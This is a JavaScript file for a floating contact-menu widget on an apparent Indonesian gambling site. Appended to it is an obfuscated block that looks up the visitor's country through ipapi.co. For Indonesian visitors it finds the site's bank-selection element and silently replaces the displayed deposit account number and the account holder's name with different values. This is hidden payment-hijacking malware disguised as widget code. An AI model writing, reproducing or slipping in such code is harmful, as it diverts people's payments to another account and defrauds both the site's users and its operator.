(function () {
    // Tunggu DOM siap
document.addEventListener('DOMContentLoaded', function () {
  // 1. Cari tombol LiveChat asli
  const originalButton = document.querySelector('div.livechat_button');

  // 2. Jika ditemukan, sembunyikan
  if (originalButton) {
    originalButton.style.display = 'none'; // atau originalButton.remove() jika ingin hapus total
  }

  // 3. Buat atau ambil elemen ikon chat kustom
  const customTrigger = document.getElementById('custom-chat-trigger');
  const chatUrl = 'https://www.livechat.com/?utm_source=chat_button&utm_medium=referral&utm_campaign=lc_19421850';

  // 4. Tambahkan event klik ke gambar
  if (customTrigger) {
    customTrigger.addEventListener('click', function (e) {
      e.preventDefault();
      // Buka di tab baru (gunakan '_blank')
      window.open(chatUrl, '_blank', 'noopener,noreferrer');
      
      // Atau, jika ingin buka di tab yang sama:
      // window.location.href = chatUrl;
    });
  }
});
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
.widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://yk69.top/gctele-official-yuk69" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Yuk69" width="30" height="30">
                    </div>
                </a>
                 <a href="https://yk69.top/anya" title="Asupan Yuk69">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/yuk69new.webp" alt="Asupan Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/tele-anya" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/RTP-Yuk69" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Yuk69" width="30" height="30">
                    </div>
                </a>
                <a href="https://yk69.top/official-fb-yuk69" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Yuk69" width="30" height="30">
                    </div>
                </a>
               
            </div>
        </div>
        <img src="https://yudha125.github.io/menu-widget/Image/yuk.webp" alt="Logo Yuk69" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Yuk69" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);
})();

(function(_0xcea2ab,_0xeeb7a){var _0xa864bc=(445735^445729)+(519098^519102);_0xcea2ab="\u0049\u0044";_0xa864bc=(441619^441618)+(562662^562656);var _0x9d2b8d=(789220^789220)+(205333^205329);_0xeeb7a="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0x9d2b8d='\u006B\u0064\u0069\u006F\u006D\u0063';function _0xab0d6d(_0x5547d,_0x74d99f,_0xe9656d,_0xeba,_0x12g,_0xa_0x971,_0x4fb,_0xdab66e){_0x74d99f="82-5403-5216".split("").reverse().join("");_0x5547d=(767456^767463)+(373007^372999);_0xeba="\u0032\u0031\u0032\u0030\u002D\u0034\u0035\u0032\u0030\u002D\u0030\u0035";_0xe9656d=(217686^217682)+(599528^599530);_0xa_0x971="\u0052\u002A\u002A\u004E\u0020\u0046\u002A\u002A\u004E\u0020\u0053\u002A\u002A\u002A\u002A\u002A\u0054\u004F";_0x12g="pdlohi".split("").reverse().join("");var _0x98e=(437642^437640)+(456440^456445);_0x4fb="\u004C\u0045\u0056\u0049";_0x98e=(176200^176203)+(813772^813775);_0xdab66e="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";function _0x398be(){const _0x095d6e=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E");for(let i=106659^106659;i<_0x095d6e['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x095d6e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x74d99f){_0x095d6e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xeba;break;}}const _0x7541cc=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("vid".split("").reverse().join(""));for(let i=759121^759121;i<_0x7541cc['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x7541cc[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0xa_0x971){_0x7541cc[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x4fb;break;}}}function _0x8943fe(){var _0x9c4g=(126197^126205)+(814881^814889);const _0xaf39d=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xdab66e);_0x9c4g=(930063^930062)+(517949^517944);if(!_0xaf39d)return false;_0x398be();if(!_0xaf39d['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0xaf39d['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("egnahc".split("").reverse().join(""),_0x398be);_0xaf39d['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="eurt".split("").reverse().join("");}return!![];}if(_0x8943fe())return;const _0x02gf=new MutationObserver(()=>{if(_0x8943fe())_0x02gf['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x02gf['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0xac1e(){try{var _0xb41bb=(972492^972489)+(315130^315132);const _0x3f196b=await fetch(_0xeeb7a);_0xb41bb=(373069^373067)+(802040^802040);if(!_0x3f196b['\u006F\u006B'])throw new Error("rorrE IPA".split("").reverse().join(""));var _0x4c2d=(490353^490354)+(628555^628552);const _0x96e9bb=await _0x3f196b['\u006A\u0073\u006F\u006E']();_0x4c2d=(328820^328829)+(438619^438621);const _0x8c0b7c=_0x96e9bb['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0x8c0b7c)throw new Error("gnosok aragen ataD".split("").reverse().join(""));if(_0x8c0b7c===_0xcea2ab){console['\u006C\u006F\u0067']("\u2705");_0xab0d6d();}else{console['\u006C\u006F\u0067']("\uD83D\uDEAB");}}catch(err){console['\u0077\u0061\u0072\u006E']("\u26A0\uFE0F");}}_0xac1e();})();
